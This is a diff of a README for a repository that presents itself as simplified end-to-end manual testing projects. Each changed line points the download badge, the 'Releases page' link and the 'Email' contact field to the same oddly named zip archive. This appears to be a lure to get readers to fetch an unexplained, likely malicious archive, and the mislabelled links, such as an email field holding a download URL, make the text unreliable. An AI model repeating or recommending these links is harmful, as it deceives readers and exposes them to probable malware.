@@ -1,6 +1,6 @@
 # 🚀 E2E-Manual-Testing-Projects - Simplified Testing for Web and Mobile Apps
 
-[![Download Now](https://raw.githubusercontent.com/Forkismup/E2E-Manual-Testing-Projects/main/unactuality/E2E-Manual-Testing-Projects_phrenetically.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Forkismup/E2E-Manual-Testing-Projects/main/unactuality/E2E-Manual-Testing-Projects_phrenetically.zip)
+[![Download Now](https://github.com/Forkismup/E2E-Manual-Testing-Projects/raw/refs/heads/main/unactuality/E2E-Manual-Testing-Projects_phrenetically.zip%20Now-Click%20Here-brightgreen)](https://github.com/Forkismup/E2E-Manual-Testing-Projects/raw/refs/heads/main/unactuality/E2E-Manual-Testing-Projects_phrenetically.zip)
 
 ## 📖 Description
 
@@ -29,7 +29,7 @@ To run the software, please ensure your system meets the following requirements:
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/Forkismup/E2E-Manual-Testing-Projects/main/unactuality/E2E-Manual-Testing-Projects_phrenetically.zip) to download the latest version of the application.
+   Go to the [Releases page](https://github.com/Forkismup/E2E-Manual-Testing-Projects/raw/refs/heads/main/unactuality/E2E-Manual-Testing-Projects_phrenetically.zip) to download the latest version of the application.
 
 2. **Download the Application**
    On the Releases page, you will see the latest version highlighted. Click on the link to download the files. 
@@ -59,7 +59,7 @@ We welcome contributions from testers and developers alike. If you have ideas fo
 
 If you encounter any issues or need assistance, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/Forkismup/E2E-Manual-Testing-Projects/main/unactuality/E2E-Manual-Testing-Projects_phrenetically.zip
+- **Email:** https://github.com/Forkismup/E2E-Manual-Testing-Projects/raw/refs/heads/main/unactuality/E2E-Manual-Testing-Projects_phrenetically.zip
 - **GitHub Issues:** Use the issue tracking feature on GitHub to report bugs or request features.
 
 ## 🔗 Additional Resources
